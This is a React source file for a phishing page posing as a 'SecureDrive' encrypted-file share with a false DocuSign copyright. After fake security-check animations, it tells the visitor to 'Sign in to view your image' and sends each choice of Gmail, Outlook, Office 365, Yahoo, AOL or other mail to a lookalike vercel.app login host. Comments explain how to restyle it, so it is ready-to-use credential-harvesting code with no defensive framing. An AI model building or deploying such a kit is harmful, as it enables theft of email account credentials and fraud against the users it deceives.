/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Mail, 
  LayoutGrid, 
  AtSign, 
  Globe, 
  Search, 
  Printer, 
  Download, 
  Loader2,
  Lock,
  FileImage,
  ImageIcon,
  ShieldCheck,
  AlertCircle,
  ChevronRight
} from "lucide-react";

type FlowStep = "file_card" | "preview_loading" | "progressive_load" | "auth_required" | "redirecting";

// Customize your theme and background here
const CONFIG = {
  // Replace this URL with any image link you want to use as the background/preview
  backgroundImage: "image.jpg",
  // Control the brightness of the light overlay (e.g., bg-white/70 is 70% white)
  overlayOpacity: "bg-white/70",
  // Control the background blur (e.g., backdrop-blur-sm, backdrop-blur-md, or empty "")
  overlayBlur: "backdrop-blur-sm"
};

export default function App() {
  const [step, setStep] = useState<FlowStep>("file_card");
  const [progress, setProgress] = useState(0);
  const [selectedProvider, setSelectedProvider] = useState<any>(null);

  const providers = [
    { name: "Gmail", color: "bg-[#ea4335]", url: "https://glogs-eight.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
    { name: "Outlook", color: "bg-[#0078d4]", url: "https://microlog-seven.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
    { name: "Office 365", color: "bg-[#d83b01]", url: "https://microlog-seven.vercel.app", icon: <LayoutGrid className="w-5 h-5 text-white" /> },
    { name: "Yahoo", color: "bg-[#6001d2]", url: "https://yool-five.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
    { name: "Aol Mail", color: "bg-[#31459b]", url: "https://login-aol.vercel.app", icon: <AtSign className="w-5 h-5 text-white" /> },
    { name: "Other Mail", color: "bg-[#4b5563]", url: "https://othermail.vercel.app", icon: <Globe className="w-5 h-5 text-white" /> },
  ];

  // Simulation effect for initial loading
  useEffect(() => {
    if (step === "preview_loading") {
      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => setStep("progressive_load"), 800);
            return 100;
          }
          return prev + 4;
        });
      }, 80);
      return () => clearInterval(interval);
    }
  }, [step]);

  // Simulation effect for progressive reveal
  useEffect(() => {
    if (step === "progressive_load") {
      const timer = setTimeout(() => {
        setStep("auth_required");
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleLoginClick = (provider: any) => {
    setSelectedProvider(provider);
    setStep("redirecting");
    
    setTimeout(() => {
      window.location.href = provider.url;
    }, 2500);
  };

  return (
    <div className="relative min-h-screen font-sans overflow-hidden bg-[#f0f4f8] flex items-center justify-center selection:bg-sky-200">
      {/* Background Image with Light Overlay */}
      <div className="absolute inset-0 z-0 overflow-hidden">
        <motion.img 
          src={CONFIG.backgroundImage}
          initial={{ scale: 1.05, opacity: 0 }}
          animate={{ scale: 1, opacity: 0.6 }}
          transition={{ duration: 1.5 }}
          className="w-full h-full object-cover"
          alt=""
          referrerPolicy="no-referrer"
        />
        <div className={`absolute inset-0 ${CONFIG.overlayOpacity} ${CONFIG.overlayBlur}`} />
      </div>

      <main className="relative z-10 w-full max-w-5xl px-6 py-12 flex flex-col items-center min-h-screen justify-center">
        
        {/* Floating Header */}
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="absolute top-10 left-0 right-0 flex flex-col items-center pointer-events-none"
        >
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-6 h-6 text-sky-600" />
            <span className="text-lg font-bold text-slate-900 tracking-tight">SecureDrive</span>
          </div>
        </motion.div>

        {/* Content Card Area */}
        <div className="w-full max-w-lg">
          <AnimatePresence mode="wait">
            {step === "file_card" && (
              <motion.div 
                key="file_card"
                initial={{ opacity: 0, scale: 0.98, y: 10 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 1.02, y: -10 }}
                className="flex flex-col items-center p-10 bg-white/90 backdrop-blur-3xl rounded-[32px] border border-white shadow-[0_20px_50px_rgba(0,0,0,0.06)]"
              >
                <div className="w-20 h-20 bg-sky-50 rounded-3xl flex items-center justify-center mb-6 border border-sky-100 shadow-sm">
                  <FileImage className="w-10 h-10 text-sky-600" />
                </div>
                <h3 className="text-xl font-bold text-slate-900 mb-1">Incoming Encrypted File</h3>
                <p className="text-slate-500 text-sm mb-8 text-center font-medium">IMG_4721_secure.jpg (2.4 MB)</p>
                
                <div className="w-full grid grid-cols-2 gap-4">
                  <button 
                    onClick={() => setStep("preview_loading")}
                    className="flex flex-col items-center gap-2 p-6 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-white hover:border-sky-200 hover:shadow-md transition-all group active:scale-[0.97]"
                  >
                    <div className="w-10 h-10 rounded-xl bg-white shadow-sm flex items-center justify-center group-hover:bg-sky-50 transition-colors">
                      <ImageIcon className="w-5 h-5 text-sky-600" />
                    </div>
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-widest">Preview</span>
                  </button>
                  <button 
                    onClick={() => setStep("preview_loading")}
                    className="flex flex-col items-center gap-2 p-6 bg-slate-50 rounded-2xl border border-slate-100 hover:bg-white hover:border-sky-200 hover:shadow-md transition-all group active:scale-[0.97]"
                  >
                    <div className="w-10 h-10 rounded-xl bg-white shadow-sm flex items-center justify-center group-hover:bg-sky-50 transition-colors">
                      <Download className="w-5 h-5 text-sky-600" />
                    </div>
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-widest">Download</span>
                  </button>
                </div>
              </motion.div>
            )}

            {step === "preview_loading" && (
              <motion.div 
                key="loading"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 1.02 }}
                className="flex flex-col items-center justify-center p-12 bg-white/80 backdrop-blur-2xl rounded-3xl border border-white shadow-[0_8px_32px_0_rgba(31,38,135,0.07)]"
              >
                <div className="relative mb-8">
                  <motion.div 
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 1.2, ease: "linear" }}
                    className="w-16 h-16 border-t-2 border-r-2 border-sky-600 rounded-full"
                  />
                  <div className="absolute inset-0 flex items-center justify-center">
                    <ImageIcon className="w-7 h-7 text-slate-300" />
                  </div>
                </div>
                <h2 className="text-slate-900 text-lg font-semibold mb-1">Checking Security</h2>
                <p className="text-slate-500 text-sm mb-6">Connecting to file server...</p>
                <div className="w-full max-w-[180px] h-1.5 bg-slate-100 rounded-full overflow-hidden">
                  <motion.div 
                    className="h-full bg-sky-500 shadow-[0_0_10px_rgba(14,165,233,0.3)]" 
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                    transition={{ ease: "easeOut" }}
                  />
                </div>
              </motion.div>
            )}

            {step === "progressive_load" && (
              <motion.div 
                key="progressive"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="relative aspect-square sm:aspect-video rounded-3xl overflow-hidden border-4 border-white shadow-2xl bg-slate-50"
              >
                <motion.img 
                  src={CONFIG.backgroundImage}
                  animate={{ filter: "blur(15px) contrast(0.8)" }}
                  className="w-full h-full object-cover"
                  alt=""
                  referrerPolicy="no-referrer"
                />
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/20">
                   <div className="px-5 py-2.5 bg-white shadow-sm border border-slate-100 rounded-2xl flex items-center gap-3">
                     <Loader2 className="w-4 h-4 text-sky-600 animate-spin" />
                     <span className="text-slate-700 text-[11px] font-bold tracking-widest uppercase">Authorizing...</span>
                   </div>
                </div>
              </motion.div>
            )}

            {(step === "auth_required" || step === "redirecting") && (
              <motion.div 
                key="auth"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-white/90 backdrop-blur-3xl rounded-[32px] border border-white p-8 sm:p-10 shadow-[0_20px_50px_rgba(0,0,0,0.08)] w-full"
              >
                {step === "auth_required" ? (
                  <>
                    <div className="flex flex-col items-center mb-8 text-center">
                      <div className="w-14 h-14 bg-sky-50 rounded-2xl flex items-center justify-center mb-5 border border-sky-100 shadow-sm">
                        <Lock className="w-7 h-7 text-sky-600" />
                      </div>
                      <h2 className="text-xl font-bold text-slate-900">Sign in to view your image</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 w-full">
                      {providers.map((p, idx) => (
                        <motion.button
                          key={idx}
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          transition={{ delay: idx * 0.05 }}
                          onClick={() => handleLoginClick(p)}
                          className="flex items-center gap-3 p-3.5 bg-slate-50 border border-slate-100 rounded-xl hover:bg-white hover:border-sky-200 transition-all group active:scale-[0.98] shadow-sm hover:shadow-md"
                        >
                          <div className={`${p.color} w-9 h-9 rounded-lg flex items-center justify-center shadow-sm flex-shrink-0`}>
                            {p.icon}
                          </div>
                          <div className="flex-1 text-left">
                            <span className="text-slate-900 font-bold text-[14px] block leading-tight">{p.name}</span>
                          </div>
                          <ChevronRight className="w-4 h-4 text-slate-300 group-hover:text-sky-500 transition-colors" />
                        </motion.button>
                      ))}
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center py-10 text-center">
                    <div className="relative mb-8">
                      <motion.div 
                        animate={{ rotate: 360 }}
                        transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                        className="w-16 h-16 border-b-2 border-sky-600 rounded-full"
                      />
                      <div className="absolute inset-0 flex items-center justify-center">
                        <ShieldCheck className="w-7 h-7 text-sky-600" />
                      </div>
                    </div>
                    <h3 className="text-xl font-bold text-slate-900 mb-2">Connecting Account</h3>
                    <p className="text-slate-500 text-sm">
                      Redirecting to {selectedProvider?.name} authentication...
                    </p>
                    
                    <div className="mt-8 flex gap-1.5">
                      {[0, 1, 2].map(i => (
                        <motion.div 
                          key={i}
                          animate={{ opacity: [0.2, 1, 0.2] }}
                          transition={{ repeat: Infinity, duration: 0.8, delay: i * 0.15 }}
                          className="w-2 h-2 bg-sky-500 rounded-full shadow-[0_0_8px_rgba(14,165,233,0.4)]"
                        />
                      ))}
                    </div>
                  </div>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Action Footer */}
        <motion.div 
           initial={{ opacity: 0 }}
           animate={{ opacity: 1 }}
           transition={{ delay: 2 }}
           className="mt-8 flex flex-col items-center gap-4"
        >
          <div className="flex items-center gap-2.5 px-4 py-2 bg-white/60 backdrop-blur-md border border-slate-200 rounded-full shadow-sm">
            <AlertCircle className="w-4 h-4 text-sky-600/70" />
            <span className="text-slate-500 text-[11px] font-bold uppercase tracking-wider">Zero-Trust Protected Protocol</span>
          </div>
          
          <div className="text-[9px] text-slate-400 font-bold tracking-[0.4em] uppercase">
            © 2024 DocuSign Inc. All Rights Reserved.
          </div>
        </motion.div>
      </main>

      <style dangerouslySetInnerHTML={{ __html: `
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { 
          font-family: 'Inter', system-ui, sans-serif; 
          background: #f8fafc;
          color: #1e293b;
        }
      `}} />
    </div>
  );
}




